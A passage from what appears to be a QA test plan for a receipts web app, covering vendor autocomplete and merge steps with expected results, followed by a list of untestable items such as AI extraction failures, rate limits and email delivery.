| 2 | Press ArrowDown, then Enter. | The field now reads "Heic Shop", the list closes, and the form is **not** submitted (no "Saved."). |
| 3 | Click **Save**. | "Saved."; heading "Heic Shop · <year>-01-01". |
| 4 | On `/receipts/vendors/`, open Heic Shop's menu > **Merge into…**. | A dialog "Merge Heic Shop into another vendor": "Its 2 receipts will show the name of the vendor you choose, and its name becomes a name that vendor is also known by." A **Merge into** select (focused) with "Choose a vendor…" and "Staples (vetted) · N receipts"; the note "This changes the vendor shown on receipts you already have…"; **Cancel** and **Merge**. |
| 5 | Click **Merge** with "Choose a vendor…" still selected. | The browser's required-field check stops it; nothing is merged. |
| 6 | Choose Staples, click **Merge**. | The page reloads with "Merged 1 vendor into Staples. <N+2> receipts now show Staples."; Heic Shop is gone and Staples' row says "Also read as “Heic Shop”". `H1` and `A1` now show Staples. |

## Out of scope

- **Watching a receipt being read.** Processing runs inline during the upload's `complete`, so the
  "Received"/"Processing" states, the dashboard's 3-second refresh while one is in flight, the
  detail page's "Reading your receipt…" panel that updates itself, and "Trying again shortly"
  (a scheduled retry after an AI outage) are not reachable here; they are unit-tested.
- **Failure reasons only the AI produces** (`multiple_receipts`, `not_a_receipt`,
  `extraction_error`) and **Needs review** straight from extraction, with the attention email's
  "Review" text line for it: the fake model always reads one confident Staples receipt.
- **Rate limits** (off here): the upload script's "Waiting a moment…" wait on a 429, the
  `RECEIPTS_*_USER` budgets.
- **Real SES delivery** of `receipts+…` mail (BCC, Gmail auto-forward, the real
  `Authentication-Results`): the shell steps feed `.eml` files to the real intake instead.
- **A real camera** behind **Take photo**, and a real OS drag of a folder (the folder drop is
  simulated with the same entry interface the browser provides).
- **The Vendors page's pagination** (50 per page) and the dashboard beyond two pages: they need far
  more vendors or receipts than a run creates.
- The JWT API (`/api/receipts/`) and the `inv receipts` CLI (unit-tested).
